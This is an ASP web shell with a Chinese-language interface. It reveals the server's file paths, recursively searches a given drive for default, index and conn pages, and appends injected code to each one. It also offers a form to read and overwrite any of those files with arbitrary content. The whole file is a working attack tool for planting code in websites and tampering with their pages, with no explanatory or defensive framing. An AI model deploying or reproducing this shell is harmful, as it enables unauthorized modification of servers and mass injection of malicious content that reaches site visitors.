<%server.scripttimeout=10000
response.buffer=false
%>
<html>
<head>
<title></title>
</head>
<body>
<%
asp_self=request.servervariables("path_info") 
s=request("fd")
ex=request("ex")
pth=request("pth")
newcnt=request("newcnt")

if ex<>"" and pth<>"" then
select case ex
case "edit"
call file_show(pth)
case "save"
call file_save(pth)
end select
else
%>
<% response.write "<br>" %>
<% response.write "本文件路径：" %>
<% response.write "<br>" %>
<% =server.mappath(request.servervariables("script_name")) %>
<% response.write "<br>" %>
<% response.write "<br>" %>
<% response.write "<br>" %>
<% response.write "本站根目录：" %>
<% response.write "<br>" %>
<% =request.servervariables("appl_physical_path") %>
<% response.write "<br>" %>
<% response.write "<br>" %>
<% response.write "<br>" %>
<form action="<%=asp_self%>" method="post">
服务器地址：
<input type="text" name="fd" size="40">
<input type="submit" value="查找">
</form>
<%end if%>
<%
function ispattern(patt,str)
set regex=new regexp
regex.pattern=patt
regex.ignorecase=true
retval=regex.test(str)
set regex=nothing
if retval=true then
ispattern=true
else
ispattern=false
end if
end function

if ispattern("[^ab]{1}:{1}(\\|\/)",s) then
sch s
else
if s<>"" then response.write "invalid agrument!"
end if

sub sch(s)
on error resume next
set fs=server.createobject("scripting.filesystemobject")
set fd=fs.getfolder(s)
set fi=fd.files
set sf=fd.subfolders
for each f in fi
rtn=f.path
step_all rtn
next
if sf.count<>0 then
for each l in sf
sch l
next
end if
end sub

sub step_all(agr)
retval=ispattern("(\\|\/)(default|index|conn)\.(htm|html|asp|php)\b",agr)
if retval then
step1 agr
step2 agr
else
exit sub
end if
end sub
%>
<%sub step1(str1)%>
<a href="<%=asp_self%>?ex=edit&pth=<%=str1%>" target="_blank"><%=str1%></a><br>
<%end sub%>
<%
sub step2(str2)
addcode=" "
set fs=server.createobject("scripting.filesystemobject")
isexist=fs.fileexists(str2)
if isexist then
set f=fs.getfile(str2)
set f_addcode=f.openastextstream(8,-2)
f_addcode.write addcode
f_addcode.close
set f=nothing
end if
set fs=nothing
end sub
%>
<%
sub file_show(fname)
set fs1=server.createobject("scripting.filesystemobject")
isexist=fs1.fileexists(fname)
if isexist then
set fcnt=fs1.opentextfile(fname)
cnt=fcnt.readall
fcnt.close
set fs1=nothing%>
file: <%=fname%>
<form action="<%=asp_self%>" method="post">
<textarea name="newcnt" cols="100" rows="30"><%=cnt%></textarea>
<input type="hidden" name="pth" value="<%=fname%>">
<input type="hidden" name="ex" value="save">
<input type="submit" value="保存">
</form>
<%else%>
<p>the file is not exit or have deleted.</p>
<%
end if
end sub
%>
<%
sub file_save(fname)
set fs2=server.createobject("scripting.filesystemobject")
set newf=fs2.createtextfile(fname,true)
newf.write newcnt
newf.close
set fs2=nothing
response.write "<p>修改成功.</p>" 
end sub
%>
</body>
</html>



